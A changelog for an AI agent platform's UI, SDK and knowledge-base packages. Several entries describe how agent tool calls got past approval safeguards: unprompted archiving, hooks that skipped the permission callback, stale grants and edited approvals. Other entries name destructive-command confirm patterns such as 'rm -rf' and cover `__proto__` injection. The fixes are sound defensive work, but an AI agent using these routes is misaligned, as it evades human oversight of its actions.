  - **ui-react**: `BlockCard` draws the `map` block. It fetches each frame's geometry through the existing `/geo/coastline` route and cache. When geometry is empty or unavailable, the frame becomes a one-line note and the list still carries every place. A shared answer draws the list and asks for no geometry. `BlockCard` takes an optional `isStatic` prop for renders nothing will update.

- 9342cd2: - **ui-sdk**: `showBlockInputSchema(form)` builds `show_block`'s input schema in a measured form, and `SHIPPED_SHOW_BLOCK_SCHEMA_FORM` names the one that ships (#336). A form can share `tone`, `valueTone` and `icon` through `definitions`, drop the field descriptions that restate the tool description, or both. Every form accepts exactly the input `SHOW_BLOCK_INPUT_SCHEMA` accepts, and the shipped schema is unchanged byte for byte.

### Patch Changes

- ba23fcc: Search can order results by relevance judgment. A new `Reranker` seam (`defineReranker`, `RerankCandidate`, `Ranked`, and `runRerankerContract` in `@schlessera/brain/testing`) has one built-in, `jev`: one TypeSafe System One Choice over the candidates per search, with each candidate's title, type, tags, summary, matched excerpt and lifecycle fields (status, relevance, updated) as evidence. It is the default rerank mode when `TYPESAFE_API_KEY` is set; without the key, search keeps the `heuristic` ordering. Measured with `brain eval` on a 1,133-document brain, hybrid hit@1 went from 0.407 (heuristic) and 0.556 (none) to 0.741 on 27 hand-written queries.

  `rerank` accepts `none | heuristic | jev` on `brain search`, `brain eval`, the MCP `brain_search` tool and `BRAIN_RERANK_MODE`. `heuristic` and `none` keep their meaning. The MCP input's default of `heuristic` is gone: an omitted `rerank` now follows the brain's `reranker.provider`. `jev` does not apply the lifecycle multipliers after its order. Applied there, they undid most of its gain.

  A new `reranker` config block sets `provider`, `model` (pinned to `jev-1.13.0`), `apiKeyEnv`, `exclude` (paths never sent, which keep their retrieval rank), `timeoutMs`, `depth` and an opt-in `skipMargin`. A reranker that fails, times out, or returns anything but a permutation leaves the retrieval order and says so in `warnings`. `brain search --rerank-dry-run` prints the outbound request and sends nothing. `brain eval` records `meta.reranker` and refuses a `--rerank jev` it cannot run. `brain doctor` gains a `reranker` check. `TYPESAFE_API_KEY` is forwarded to brain subprocesses and cron jobs.

  The helpers a search fanning out over several sources needs to rerank the union are exported: `partitionForRerank`, `mergeWithheld`, `assertPermutation`, `buildPathMatcher`, `candidateKey`, `selectReranker` and `rerankSetup`.

- Updated dependencies [c1ac8c9]
- Updated dependencies [cf94a81]
- Updated dependencies [b1805ee]
- Updated dependencies [b8c355d]
  - @schlessera/brain-ui-kit@0.39.0

## 0.38.0

### Patch Changes

- 8c1daaa: A bare address with a backtick in it, such as `` <eury`bates@ithaca.example> `` or a URL whose path holds one, now flattens to its text like any other bare address. Before, it kept the whole table, list, quote or key-value run it sat in out of the classification pass.
- aec3dd8: The container privilege record moved to brain-hosting-template, which builds the container. The exec wrapper's cancellation error message and the comments that cite the record now point there.
- a9094fb: The classification detector no longer drops text. A list item that holds any block besides paragraphs (a quote, a heading, a definition) now keeps its list as markdown instead of offering it as an ordered or timed list without that block, and a hard break reads as a space in a quote, its attribution or a list item, so `Sail` and `home` on either side of one no longer run together as `Sailhome`.
- 1d29fcd: A key-value run's values now read the way the same text reads in a quote, a table or a list. Before, they kept their markdown source: `**Crew:** **600**` gave the value `**600**`, `12 &amp; more` stayed encoded and `\*600\*` kept its backslashes. The keys are still read from the source. An escaped or entity-encoded `mailto:` still stays in the value, and now reads as `mailto:` rather than as `mailto&#58;`.
- 94fd8c9: Each meaning an answer block carried in ink colour alone now also draws a non-colour cue, derived from the tone the payload already carries, so it survives a grayscale print and a reader who cannot tell the hues apart. A judged value in `ComparisonTable`, `StatTiles`, `DataTable`, `Receipt`, `ContactCard` and the `TrendChart` delta draws its tone's glyph from the kit's icon vocabulary (red a triangle, gold a circle, amber a hand, purple a question mark; teal, blue, neutral, ink and dim draw none). `TimelineList` draws an event kind's glyph in place of the dot, `ScheduleList` leads a title with the claim on you, `StepList`'s current step wears a 2px ring, and a company or project `ContactCard` leads its role line with the kind word. No payload field, prop, token or icon key is added. `show_block`'s `bars` description now says a bar's tone is the class of work, not a judgement.
- 70a5502: The classification pass now offers a table column named after an `Object.prototype` member, such as `constructor` or `__proto__`, as a `recommended` option, so the classifier can mark it as the recommended column. A key-value line keyed `__proto__` is likewise offered as the line that holds a contact's name.
- 2d985ba: `show_block`'s `receipt` description now states how long a value can be before it wraps on a phone: 25 characters for a toned row, whose glyph costs three, and 28 untoned, in the chat on a 320px phone. The figures are measured by a browser test in `@schlessera/brain-ui-kit`.
- d350daa: Transient output now has a place inside the brain: the scratch area, `.brain/scratch/`. `brain render --scratch` and `brain image --scratch` write there, under a name unique to each run, and so does `brain render -` without `--out`. The chat UI can open anything written there, it is never committed, indexed or exported, and it is pruned after 7 days or past 1 GB (after each of these writes, by `brain maintain`, hourly by the chat server, and by the new `brain scratch clean|prune`). Nothing writes there until git excludes the directory itself (`brain doctor --fix` adds the line, new brains have it from the template, and outside a git repository the line is required all the same, read by git), nothing is written to or pruned from a `.brain` or `.brain/scratch` that is a symlink, and every write goes to a temporary sibling renamed onto its name, so it never writes through a planted link. That covers every one of brain's own transient writers, wherever it is pointed: `brain render --out`, `brain image --out`, `brain okf export --out`, and a mask requested beside a draft in scratch, which now prunes like the others.

  Behaviour change: `brain render --out`, `brain image --out` and `brain okf export` never write through a symlink any more: a target whose entry is a link is refused, and every write goes to a temporary sibling renamed onto the name. `brain render` and `brain image` no longer accept paths under the system temp directory. A file there could not be opened from the UI. Use `--scratch` instead. `resolveWritable` now returns the path or `null`.

  `brain scratch clean|prune --json` reports `failed: [{ path, reason }]` (additive) for files the OS would not remove, and exits 2 when there are any; `brain maintain` reports its scratch step as failed the same way. A replaced output file keeps its mode. `BrainUiApp.close()` now returns a promise that resolves once the scratch prune pass in flight, if any, has been killed and has exited; await it before tearing down.

- e4b5251: Each of the nine extension seams (`EmbeddingProvider`, `CompletionProvider`, `AgentRunner`, `SkillEmitter`, `AgentBackend`, `SpeechProvider`, `AsrClient`, `ToolRenderer`, `SiteAdapter`) now carries its own `@experimental` tag, as do `BackendBridge`, `BackendCapabilities`, `StartTurnRequest`, `RendererPack`, `SpeechSession`, `AsrClientOptions`, `AdapterResult` and `ScrapeContext`, so an editor tooltip and the published declarations say what the docs already did. No shape changes. The ui-sdk README now states protocol rev 4.
- 4224247: Source comments, the `BRAIN_UI_CHROME_NO_SANDBOX` description, and the `generate-pdf` and `image-gen` skills no longer describe one particular deployment. They say what a deployment may or may not have instead.

## 0.37.0

### Minor Changes

- 7fe9bc0: An approval decision records the channel it was made on. `tool_approval` and
  `tool_denial` gain an optional `channel` (`card` | `voice`), stored on the
  `approval_decision` activity event; the host refuses a voice-attributed grant
  and leaves the request pending; the web client's approval cards send `card`;
  and a resolved approval in Actions reads as the decision and its channel
  ("Denied by voice").
- 907e8bc: Archiving a document through `brain_update` now raises an approval card.

  Archiving is confirmed because it is a visibility change: an archived document
  drops out of search, briefings and context assembly, so a silent archive shows
  up later as holes in output nobody can account for. Two paths to it stopped for
  approval — `brain_archive` is off the default allowlist, `brain archive` matches
  a confirm pattern — and a third did not. `brain_update` takes the same `status`
  field and is auto-allowed, so `status: "archived"` made a document invisible to
  every later search with no card, no confirmation and no record.

  `decideToolPermission` now raises a per-use confirmation for a document update
  that sets `status: "archived"`, and both backends pass it their spelling of the
  tool (`updateToolName`). It is deliberately a per-use confirmation, never a
  grantable tool approval: a remembered "always allow" would reopen the hole for
  good.

  Nothing else changes. An update with no `status`, or with `"active"` or
  `"draft"`, runs unprompted exactly as before — this is not a card on every
  document edit. `brain_update`'s MCP input schema, output shape and name are
  untouched.

- e77ab6f: A bare email address or URL no longer keeps an answer's table, list, quote or
  key-value run out of the classification pass. GFM turns a bare address into a
  link, and any link used to reject the whole candidate; now a link whose text is
  its own destination flattens to that text, and a `mailto:` address reads as the
  bare address. A run of facts about a person that carries an email can become a
  contact card. A labelled link (`[the docs](https://…)`) still leaves its
  candidate as markdown, because flattening it would lose where it points.
- 6ae12e7: A destructive-command approval card now says what the command will do.

  - Added: each default confirm pattern carries an `effect` phrase ("delete a directory and everything inside it"). A `command` approval's reason is that phrase, and both approval cards show it.
  - Changed: `DEFAULT_CONFIRM_BASH_PATTERNS` entries are `{ pattern, effect }`. `confirmBashPatterns` and `compileConfirmPatterns` accept that form or a bare regex source; a bare source keeps the old generic sentence.
  - Changed: `BRAIN_UI_CONFIRM_BASH` accepts the object form too. A non-empty list with no entry of a usable shape now means the defaults rather than "no confirmation". A list whose patterns are all invalid regexes still compiles to none (#251).

- d9d4061: The classification pass draws a contact card. A run of key-and-value lines
  about one person, company or project — the shape a model types when it answers
  "who is this?" — could previously become a receipt at best; the route D42
  specified for it was never built. The classifier now picks which line holds the
  name, the rest become the card's facts, and a run it cannot name is left as
  markdown rather than given a label the text does not carry.

  Values in a key-value run also carry a tone now, on receipt rows, stat tiles
  and a contact's facts alike: a failed outcome reads red, a pending one amber,
  an absent one dim. The tone needs the higher confidence bar every other tone
  needs, and is asked only of a run of eight lines or fewer.

  No new block kind and no protocol change — both arrive through the existing
  `message_blocks` frame as variants `show_block` already carried.

  `trend` deliberately gets no route: with `bars`, it is one of the two block
  kinds whose payload is numbers rather than the answer's own text, and deriving
  those from prose is not a judgment the classifier is asked to make. D45 records
  the reasoning.

- 4ed02fb: An approval that comes back with an edited input is re-checked before it runs, on both backends.

  - Added: `checkEditedApproval` in `@schlessera/brain-ui-sdk/server`.
  - Changed (pi): an edit that needs a confirmation the card did not show (another confirm pattern, another archived document) is refused instead of applied.
  - Changed (Claude): an edited confirmation that passes the re-check is applied instead of refused, as `updatedInput` with no `permissionDecision`. `canUseTool` re-checks edits too, and the rtk rewrite leaves a confirmed command alone.

- 7b6b2b0: An approval that edits a confirmed shell command into a different command that still needs confirmation is now refused.

  - Changed: `checkEditedApproval` identifies a shell confirmation by the command text as well as the pattern. `brain archive a.md` can no longer be approved as `brain archive b.md`, and a narrower command (`rm -rf notes` → `rm -rf notes/old`) must be re-issued and confirmed as it is. An edit that needs no confirmation of its own is still applied.
  - Changed: an edited input carrying an own `__proto__` key is refused on both backends, instead of being merged into the tool arguments.
  - Changed: `requestToolPermission` hands back an approval's edited input as one plain JSON snapshot, so what is checked is what runs; an edit that is not a plain object or will not serialize is denied.

- ecc93b9: A turn can declare `enforceAllowedTools`, and a tool its allowlist leaves out
  is then no longer re-admitted without a decision.

  Several things used to re-admit it, which is the point rather than the number.
  The Claude backend's input-rewrite hooks answered `permissionDecision: "allow"`
  so their `updatedInput` would apply, which makes the runtime skip `canUseTool`
  entirely — an rtk-rewritten shell command ran in a turn whose allowlist had no
  `Bash` in it, with no card and no record. The ws host answered from its
  remembered "always allow" grants before any card existed, so a grant given
  under a wide posture was honoured under a narrow one. And the runtime admits
  some calls on its own before the callback is reached at all — by the shape of a
  shell command, by the tool being a built-in, or because a hook declared in the
  project settings said so.

  Under the declaration the rewrites still rewrite — `updatedInput` applies
  without a decision attached, so the rewrite was never what the grant was for —
  a PreToolUse hook answers "ask" for every off-list tool, which overrides the
  runtime's own auto-approval, and the host neither answers from nor adds to its
  grant store for a tool outside the turn's allowlist. Backends mark such
  requests `outsideEnforcedAllowlist` so the host does not have to guess, and it
  records both halves of the refusal — a grant it declines to apply, and an
  "always allow" it declines to keep. A turn
  that declares nothing is unchanged, and existing grants keep working on the
  postures that can honour them.

- d33492e: The server now knows which Claude Code ran.

  - **At boot**, `createApp()` probes the binary a turn would spawn: the one the Agent SDK selects, run through the exec wrapper with a turn's environment. It refuses to start when that binary is missing or will not answer `--version`, instead of failing the first turn. It warns, naming both pairs, when the runtime is not the Claude Code / Agent SDK pair the backend was measured against (`MEASURED_RUNTIME`).
  - **Per turn**, each run's root span records the Claude Code version that ran and the SDK version. It also records the credential the CLI selected and the billing mode that credential implies. That mode is checked against the profile's policy: a profile without its own credential requires the subscription, and a run that contradicts it is flagged, with a WARN log.
  - **Auth failures** (`authentication_failed`, `oauth_org_not_allowed`, `account_on_hold`, `billing_error`, and a turn the subscription check refused) are recorded as their own failure class.
  - **Model discovery** now reports a refused credential as an auth failure instead of returning an empty roster.
  - **`/api/status`** (behind the auth guard) gains `runtime`: what boot found, what the last turn ran on, and the last auth failure.

  `BackendActivityEvent` gains `runtime_observed` and `auth_failure`. `BackendModule` gains the optional `probeRuntime`.

  **Host impact:** a host whose `CLAUDE_CODE_PATH` (default `/usr/local/bin/claude`) names no working binary now fails at boot rather than on the first turn.

- 54eea05: `BRAIN_UI_EXEC_WRAPPER`: an absolute path to an executable that agent and brain
  CLI subprocesses are launched through, as `<wrapper> <program> <args…>`. It lets
  a host run those children as another user without the packages knowing how. The
  wrapper is an argv[0], never a command line — no shell parses it, so a value
  full of metacharacters is a filename rather than a command. A wrapped child
  leads its own process group and an abort signals the group, because a uid drop
  otherwise makes `kill(2)` fail with EPERM and leaves an aborted turn running.

  Every brain CLI launch is covered too, not only the agent's tool spawns — and
  scheduled cron jobs with them: the CLI imports the repository's
  `brain.config.ts`, so a search executes repository code exactly as a tool call
  does. When a wrapper is configured the program is resolved to an absolute path,
  because a wrapper execs its target directly and because `PATH` must not get to
  choose which `bash` runs.

  `BRAIN_UI_EXEC_KILLER` is the companion seam. `kill(2)` matches uids and group
  membership grants no exception, so once a wrapper has dropped privileges the
  server can signal nothing at all; a host that drops uid supplies an authorised
  helper, invoked as `<killer> <pgid> <TERM|KILL|INT>`. With neither configured,
  and with a wrapper that has not changed uid, the group signal is used directly.
  A cancellation that fails entirely is reported rather than swallowed.

  Unset — which is every existing deployment — every spawn is exactly what it was.

- 97837c1: A turn that declares `noGrantSurface` without `enforceAllowedTools` is now refused.

  - Added: `assertTurnPosture(req)` in `@schlessera/brain-ui-sdk/server`.
  - Changed: both backends' `startTurn` reject that request with a `BackendRequestError` before anything is emitted. A turn declaring both, `enforceAllowedTools` alone, or neither is unchanged.

- 1de4d6c: A turn can declare `noGrantSurface`, and a permission request it cannot put to
  anyone is then denied instead of parked. `enforceAllowedTools` removed the ways
  a tool got admitted without a decision; what it left was the decision itself —
  an off-posture tool raises an approval card, and in a turn nobody is looking at
  (a spoken one, an unattended one) that is a card nobody can answer, held until
  the turn budget expires.

  Under the declaration both backends refuse the request where it is raised, with
  a message that names the tool and is written to be read aloud, and report it on
  the activity side channel so the record shows a denied span rather than a call
  that errored. Both request kinds are covered, including the confirm-pattern
  `command` request a destructive shell command raises for an allowlisted `Bash`
  — on the Claude backend that one never reaches `canUseTool` at all. The mask
  editor, which opens a window and then blocks on a region someone has to paint,
  is withheld from such a turn rather than offered and blocked on.

  The `ask` the Claude backend's enforcement hook answers is unchanged: it is
  what beats the runtime's own shortcuts, and this changes the decision it
  forces, not the ask. A turn that declares nothing is unchanged, and so is one
  that declares only `enforceAllowedTools`.

- fa09aaa: Land fills for a mainland view: an open coastline is closed against the viewport on the land side.

  `prepareLand` used to keep only the rings that closed on their own, so an island came back filled and a mainland shore came back as a bare stroke that does not say which side is water. It now closes an open shore against the requested bbox using OSM's land-on-the-left winding: a counterclockwise walk from where the shore leaves the box to where the next shore comes in. That gets a peninsula and a bay right without deciding between them, and two shores bounding the same land — an island wider than the view, an isthmus — come out as the one ring they bound rather than as two overlapping claims.

  Two things come with it. `stitch` now joins ways from both ends rather than only forward, which is what makes a shore that Overpass returned out of order one chain instead of two half-chains that close against nothing. And `prepareLand` takes an optional `onLand` witness — the road network from the same response — and drops the closure rather than drawing it when the fill turns out not to contain the roads.

  New from `@schlessera/brain-ui-sdk/server`: `closeAgainstViewport`, `signedArea`, `stitch`, and the `LandOptions` type. `CoastlineResult`'s shape is unchanged; its `land` key now carries mainland rings where it was empty before. The strait fixture in `@schlessera/brain-ui-kit` is regenerated with its three land rings.

- 08d4ed2: A reference-style link, image or footnote (`[the docs][ref]`, `![alt][ref]`,
  `[^note]`) now keeps its candidate out of the classification pass, as an inline
  link already did. Before, it flattened to its text and lost where it pointed.
  A `mailto:` at the end of another word (`notmailto:x@…`) is no longer taken for
  the scheme and cut from the address.
- 4d409c0: A run's effective cost is now priced by the route its inference actually took,
  not by model id alone. The two pricing catalogs carry some of the same ids at
  different rates — OpenRouter resells models their vendors also sell directly —
  so a run that went straight to the vendor was being priced at OpenRouter's
  resale rate whenever both catalogs listed its model. On
  `deepseek/deepseek-chat`, live today, that overstates output cost by 2.1x.

  Backends now classify a profile's route (`classifyRoute`, beside
  `classifyBilling`); it is resolved once at run start, rides the root span like
  the billing mode, and selects the catalog inside the rollup. Nothing became
  async: `resolve()` is still synchronous and still never touches the network.

  Coverage does not narrow. A run whose route is unknown — everything recorded
  before this change, or a profile behind a proxy no backend recognises — prices
  exactly as it did before rather than going unpriced. A rate borrowed from the
  catalog a run did not go through still prices the run, flagged as an estimate.
  Unknown cost remains unknown and never renders as `$0`.

- 146d5a9: `GET /api/activity/stats?days=N` — the runtime half of a stats page. It
  reports what the server's own database holds: lifetime session, turn and cost
  figures from the session catalog; a windowed run, token and cost summary from
  the activity rollups, labelled with the days it actually covers, where detail
  pruning starts and how many runs in the window are already rollup-only; the
  averages a caller would otherwise recompute; and the database's size.

  Each cost sum stays a sum of known values carrying **its own** excluded count,
  because the two columns are independently nullable: `costUsd` excludes
  `unpricedListCostRuns`, `effectiveCostUsd` excludes `unpricedRuns`, and a
  subscription-billed run with no backend-reported cost lands in the first and
  not the second. An average is `null` rather than `0` whenever its own sum is
  incomplete or its denominator is zero, and no clock-derived denominator is
  invented from a timestamp that lies in the future. `GET /api/brain/stats` is
  unchanged and stays the corpus channel. The shape is `ActivityRuntimeStats` in
  `@schlessera/brain-ui-sdk/protocol`.

- 92a599d: - Fixed: a caller-supplied confirm `RegExp` with the `g` or `y` flag now matches the same command on every call, where it used to match on every other one.
- 09d9f4e: The Claude subscription token is minted off the host and rotated by redeploy. The procedure is in `docs/hosting/README.md`, "Claude subscription login". The server's side of it:

  - `BRAIN_UI_CLAUDE_TOKEN_MINTED_AT` records the date the token was minted. It is server-only and set next to the token. From 30 days before the one-year expiry, the server logs a WARN at boot and at most once a day. A token without the date gets one WARN at boot saying the server cannot warn. A date the server cannot read refuses the boot.
  - `/api/status` gains a `subscription` object: `tokenSet` (never the token itself), `mintedAt`, `expiresAt`, and `lastProvenAt` / `provenBy`. The last proof is either the latest successful turn on the subscription, read from the activity store, or a successful model-discovery call with the token. The object also carries `lastAuthFailure` with an `action`.
  - Every auth failure on the subscription logs one WARN with the instruction for it. `relogin` covers a rejected token or a 401 from model discovery. `check_account` covers `oauth_org_not_allowed`, `account_on_hold` and `billing_error`, which a new token will not fix. `check_config` covers `subscription_required`, a turn the backend refused before sending it. `runtime.lastAuthFailure` carries the same `action`. A failure on a profile with its own credential gets no action, and its WARN points at that profile. Credential-shaped text in a runtime message is redacted.
  - `@schlessera/brain-ui-sdk` exports `subscriptionAuthAction`, `SUBSCRIPTION_AUTH_INSTRUCTIONS` and `SUBSCRIPTION_RELOGIN_PROCEDURE`. `BackendModelSourceState` gains `subscriptionProvenAt` and `subscriptionRefused`.
  - The server README's `ANTHROPIC_API_KEY` and `CLAUDE_CODE_OAUTH_TOKEN` rows now say what those variables do.

- f489482: An approval card no longer offers "Always allow" for a grant the host will not
  keep. `tool_approval_request` gains an optional `rememberable: false`, sent for
  a request outside the turn's enforced allowlist (or by a host with no grant
  store) and again when the card is re-delivered on reconnect; both approval surfaces hide the button for it, and
  the Actions receipt no longer prints "Always allowed" for a decision that was
  not remembered.
- f7b46d3: A table wider than four option columns is no longer asked which column the text
  recommends. That question offered one option per column, the classifier takes at
  most 255, and one oversized question failed the classification pass for every
  candidate in the answer. A comparison is drawn with at most four options, so the
  answer had no use for a wider table anyway. Its shape is still asked, so a table
  of up to six columns can still become a data table.
- 1bf00b8: The classification pass now records what the classifier was confident about,
  per question, so the swap thresholds can be moved on a distribution instead of
  on a guess.

  An answered pass writes one row per answered question to a new
  `classification_confidence` table (migration 016, additive): the candidate it
  was asked about, its kind, the question, the answer, its confidence, the line
  that confidence had to clear, and whether the candidate ended up drawn as a
  block or left as markdown. One pass's rows share a `pass_id`, so
  `(pass_id, candidate_id)` names one candidate and a question can be read
  conditioned on another answer about the same candidate — which some of them must be, since the catalogue asks
  `criteria_first` of every table including the ones the shape answer calls
  `data`.
  The write happens after the classifier call has resolved, so it takes none of
  the call's 2 s budget, and a write that fails is a log line rather than a block
  the reader does not get. Rows age out after 30 days.

  `confidenceDistribution` (exported from `@schlessera/brain-ui-server`) reads it
  back bucketed per candidate kind and question. `observeClassification`,
  `thresholdOf`, `ClassificationQuestions` and `AskedQuestion` are new in
  `@schlessera/brain-ui-sdk/server`.

  Every catalogue question now declares the line its answer has to clear, next to
  the question itself, and the transforms compare against the line of the
  question that was actually asked. A recorded confidence and the line it was
  gated by therefore cannot drift apart — including for a question whose id is
  generated per row, which a lookup keyed by question name could not cover at
  all. `ClassificationRequest.questions` is the same set with the lines stripped:
  where the surface acts on a probability is not something the classifier is
  asked.

  No threshold changed, and nothing leaves the machine.

## 0.36.0

### Minor Changes

- 9827a47: `message_blocks` (protocol rev 4, additive) and the classification module
  (D42). A host may classify a finished turn's assistant markdown into the
  kit's answer blocks and send one `message_blocks` frame after the turn's
  `result`; replayed history carries the same objects on `blocks`. The SDK
  holds the deterministic half — `detectCandidates` walks a text part's
  markdown for tables, ordered lists, timed lists, blockquotes and
  key-value runs with exact character spans — and the catalogue that
  generates one classifier request from the candidates and turns the answers
  back into D41's `Block` union, re-validated against the block schema. No
  network here: the transport is the server's.

  Code spans and emphasis inside a candidate flatten to their text; only
  links, images and raw HTML keep a candidate as markdown, since those are
  the inline forms whose meaning a plain cell would lose.

- bbc90ab: Map geometry for anywhere, not just the five fixture locations.

  `MapView` draws whatever `[lon, lat]` paths it is handed and fetches nothing —
  that is D13 and it stays that way. What was missing was the other half: a
  server that can produce those paths for an arbitrary place. Without it the kit
  had real coastline for five Mediterranean islands and a bare graticule
  everywhere else, which is a demo rather than a feature.

  `@schlessera/brain-ui-sdk/server` gains `fetchCoastline` and the pure geometry
  behind it — `clipLine` (Liang-Barsky), `simplify` (Douglas-Peucker),
  `toleranceMetres` and `prepare`. The build-time fixture pipeline shells out to
  mapshaper, which is 15 MB and 31 dependencies for exactly two operations;
  pulling that into a server to run per request would be the wrong trade. What
  must NOT be hand-rolled is polygon ring closure, which D25 measured getting
  three of five locations wrong — that is fill, and this does not attempt it.

  Validated against the tool it replaces rather than assumed: the same Overpass
  response through both pipelines gives **identical extents to four decimal
  places**, with 16% more vertices and more separate polylines because mapshaper
  joins contiguous ways.

  `@schlessera/brain-ui-server` gains `GET /api/geo/coastline?bbox=w,s,e,n`,
  fetched once and cached on disk forever. The cache is not an optimisation, it
  is what makes using a free shared service defensible: Overpass's usage policy
  is written for light interactive use, and one request per place ever is that.
  Coastlines do not move, so there is deliberately no TTL. Keys are quantised to
  ~110 m and bucketed by render width so near-identical views share an entry, and
  concurrent requests for one place collapse to a single fetch.

  It cannot return a 500. Every failure path is empty geometry with a 200,
  because a map without coastline is still a correct locator and a 500 is a chat
  message that will not render. An empty result is never cached, so an outage
  does not become permanent.

  Four new environment variables, all optional: `BRAIN_UI_COASTLINE`,
  `OVERPASS_URL`, `OVERPASS_USER_AGENT`, `COASTLINE_CACHE_DIR`.

- 6b57843: Add UI roots and a React provider with independent stores, persistence, request
  caches, renderer/ASR registries and WebSocket lifetimes. Store hooks select from
  the nearest provider; connection handlers close over that same root. Multiple
  consumers share one socket within a root, and disposing it releases its resources.

  Add an ASR registry factory to the SDK. The default application entry points
  remain available. Component API/config migration is still in progress, so this
  does not yet make the entire application safe for separate backends in one page.

- b3a3ffd: Map geometry picks its detail from how much ground fits on screen.

  A coastline is the right answer for a region and the wrong one for a street: at
  a kilometre across, a shoreline is one curve at the edge and the map is empty
  except for its own pins. `fetchCoastline` now chooses between three tiers —
  shape only, the road network, every street — and the caller does not ask, so it
  cannot get it wrong.

  The thresholds are the same one-pixel reasoning the simplification tolerance
  uses, applied to the SPACING of a feature class rather than to its detail.
  Major roads sit roughly a kilometre apart and read as a network below ~40 m/px;
  minor streets sit roughly a hundred metres apart and need ~8 m/px before they
  are twelve pixels apart. `detailFor(bbox, widthPx)` is the rule, and `detail`
  on the request forces a finer tier for the one case a size rule cannot see — a
  single shoreline curve at a span the rule calls coastline-sized.

  Each tier's query now degrades on its own. The street tier is three sequential
  requests and a free service under load refuses them individually; all-or-nothing
  threw away a perfectly good coastline because the minor streets timed out. The
  result reports `partial` when that happens, and the server route declines to
  cache a partial — the cache has no TTL, so a bad afternoon would otherwise
  become a street map that never gets its streets.

  `GET /api/geo/coastline` takes `detail=` and keys its cache by tier: the same
  box at the same width can legitimately be asked for at two levels, and serving
  the coarse one for the fine request draws an empty map.

- 2c9e5d3: MapView: a subtle land fill, and a projection that no longer stretches.

  **Land.** A coastline stroke says where the edge is and not which side of it is
  water, which is the first thing a reader needs. `MapView` gains a `land` prop —
  separate from `paths`, because a route is a line somebody travelled and land is
  the ground it was travelled over — drawn as one `<path>` with `fill-rule:
evenodd` so a lagoon inside an island comes out as a hole. `--bk-map-land` is 6%
  white; 3.5% was tried first and was genuinely invisible.

  Islands only, and that is a measured decision rather than a limitation accepted
  by default. An island's coastline stitches head-to-tail into a closed loop and
  is land beyond argument; a mainland shore has to be closed against the viewport,
  which D25 measured getting three of five locations wrong. Verified before
  building that OSM's land-on-the-left winding holds — 486 of 486 closed rings
  counter-clockwise — so the mainland case is now a contained second step rather
  than a research problem.

  `@schlessera/brain-ui-sdk/server` gains `closedRings` and `prepareLand`. Ring
  simplification splits at the two most distant vertices so the loop cannot be
  opened, and land is built from RAW ways: clipping and simplifying both move
  endpoints, and a way whose endpoint moved no longer meets its neighbour.

  **The projection.** It mapped longitude across the full width and latitude
  across the full height independently, so a degree of each stopped being the same
  distance on screen — an island got wider as the window did and the scale bar was
  only true east-west. The projection is now built for the width the card actually
  is, and the bbox is expanded on its short axis until one pixel is the same
  distance both ways. Expanded, never cropped: a wider card shows more ground at
  the same scale rather than the same ground stretched.

  `spanKm` consequently means the span across the WIDTH. Applied to both axes it
  made a card captioned "18 km" draw forty, because with one scale a minimum on
  the short axis lets the long one show roughly twice it.

- edb547b: `show_block`: the kit's answer blocks reach the model through one tool (D41).

  A new tool component contract, `SHOW_BLOCK_CONTRACT`, whose argument is a
  discriminated union of eleven data-only blocks — `comparison`, `stats`,
  `trend`, `table`, `bars`, `receipt`, `steps`, `timeline`, `schedule`, `quote`
  and `contact` — each mirroring the props of the kit component that draws it.
  The tool has no side effect: `handleShowBlock` validates and echoes, so the
  payload is the input and it needs no bridge. It joins `BRIDGE_TOOL_CONTRACTS`
  and the auto-allow posture, `SurfaceTools` gains `block`, and the generated
  prompt paragraph carries a brief that says when a block beats prose while the
  description carries the shape rules. The schema's tone lists are exported as
  runtime constants so a consumer can assert them against the kit's unions.

  The brief leads with the one rule the model most often breaks — never a
  markdown table, call the tool — and the description opens with the same
  redirect, because a table the model would have typed is a `comparison` or
  a `table` block that was not drawn.

- f5512f7: Tool component contracts: one declaration per tool, read by both halves.

  A tool that renders as a component was previously described in four places at
  once — a name constant, a description constant, an input schema, a payload
  interface the handler happened to return, and a hand-written paragraph in the
  system prompt. Nothing tied them together, so a tool could be schema'd and
  never described to the model, and a renderer could be typed for a payload the
  handler had stopped sending.

  `@schlessera/brain-ui-sdk/tool-contracts` is now the single declaration:
  `{ name, description, input, brief }`, plus `payload` for a tool whose result
  is meant to be drawn rather than read. It is React-free and free of node
  built-ins, so the server builds its tool definitions and prompt brief from the
  same object the browser parses payloads with. The four bridge tools —
  `ask_user`, `get_current_location`, `request_image_mask`, `query_activity` —
  are declared there; the handlers stay in `/server` and both barrels re-export
  the contracts, so backend import sites are unchanged.

  What this closes:

  - The prompt's tool paragraph is GENERATED from the contract list. Adding a
    contract without deciding how a backend declares its tool is a `tsc` error.
  - Payload schemas are bound to their interfaces in both directions by a
    compile-time equality test, so a schema that drifts from what the handler
    returns fails the typecheck rather than a renderer at runtime.
  - `pi`'s `request_image_mask` now serialises its payload into `output` like
    every other payload tool, instead of reporting a sentence. That is a
    deliberate change to what the model sees, and it carries the `note` field pi
    used to drop.
  - Both backends convert input schemas through one helper, so the same tool
    advertises the same JSON Schema on either adapter.

## 0.35.0

### Minor Changes

- f89897b: Attribute activity spans, append-only approval decisions, and durable run rollups to principals, with historical label and kind snapshots that survive retention pruning.

## 0.34.1

### Patch Changes

- aade466: Show when the server refuses the live connection, including a specific connection-limit message and a retry action, instead of leaving the composer on “Connecting...” forever.

## 0.34.0

### Minor Changes

- 4adb327: Added the published backend contract harness and moved both first-party backends onto it.
- 17706aa: Add the shared permission-decision core and split backend factories into focused turn, usage, and runtime modules.
- c6d9a30: Add self-describing backend modules and make the server registry iterate their profile, settings, billing, credential, and discovery hooks.

  Preserve descriptor resolution hooks and model discovery when a third-party backend is passed by value through the static registry, and validate active backend-owned profile rules before startup completes without requiring or strictly parsing inactive backend packages.

  Change session routing to reject an unknown non-empty stored backend id instead of silently substituting the default; null and empty legacy ids still use the default.

### Patch Changes

- a41e81a: - Define the four browser bridge tools once in the UI SDK while preserving Claude's names, descriptions, schemas, and result envelopes.
  - Reject NUL, absolute, traversal-escape, and symlink-escape paths before either backend writes an image mask.
  - Give pi's `ask_user` the full shared description, 1–4 question and 2–4 option bounds, a 12-character header bound, and optional option previews.
  - Require pi's `ask_user.multiSelect` instead of defaulting it to `false`.
  - Return pi's shared `ask_user` payload (echoed questions, answers, and annotations) to the model while keeping the full `AskUserResult` in details.
  - Advertise and validate pi's `query_activity.scope` as the shared enum.

## 0.33.1

### Patch Changes

